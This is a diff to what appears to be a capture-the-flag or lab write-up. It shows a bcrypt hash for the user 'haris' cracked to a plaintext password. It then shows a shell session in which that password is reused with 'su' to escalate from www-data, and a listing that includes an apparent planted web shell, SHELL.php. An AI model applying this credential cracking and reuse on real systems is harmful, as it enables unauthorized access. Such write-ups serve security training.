@@ -1740,6 +1740,34 @@ haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
 The `haris` hash cracked successfully to the plaintext password **`bestfriends`**. The `admin` hash produced no result — confirming the admin account uses a stronger password not present in the rockyou wordlist.
 
 With a plaintext credential for `haris` in hand, the next step is to test whether this password is reused for the OS-level `haris` account on the system.
+
+```shell
+www-data@enigma:~/html/openstamanager/files$ su haris
+su haris
+Password: bestfriends
+pwd
+/var/www/html/openstamanager/files
+lls
+bash: line 2: lls: command not found
+ls
+backups
+dashboard
+fatture
+hashes.txt
+importFE_ZIP
+impostazioni
+provenienze
+receiptFE
+relazioni_anagrafiche
+settori_merceologici
+SHELL.php
+stato_servizi
+temp
+utenti
+zone
+id
+uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
+```
 <div align="center">
 <br>
 <br>
